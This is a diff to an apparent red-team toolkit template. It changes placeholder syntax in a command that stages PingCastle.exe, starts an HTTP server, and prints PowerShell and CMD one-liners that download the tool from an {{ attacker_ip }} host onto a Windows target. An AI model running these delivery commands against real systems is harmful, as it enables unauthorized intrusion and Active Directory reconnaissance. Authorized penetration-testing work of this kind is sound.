@@ -6,12 +6,12 @@ metadata:
   author: "@anakles"
 
 content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/pingcastle/PingCastle.exe packstation/outbound; \
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pingcastle/PingCastle.exe packstation/outbound; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PingCastle.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PingCastle.exe'; \
+  echo 'Deliver: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe'; \
   echo '================================================================'; \
   echo '                         -----CMD-----                          '; \
-  echo 'Deliver: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PingCastle.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PingCastle.exe'; \
+  echo 'Deliver: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PingCastle.exe -Outfile {{ delivery_path_windows }}\PingCastle.exe'; \
   echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
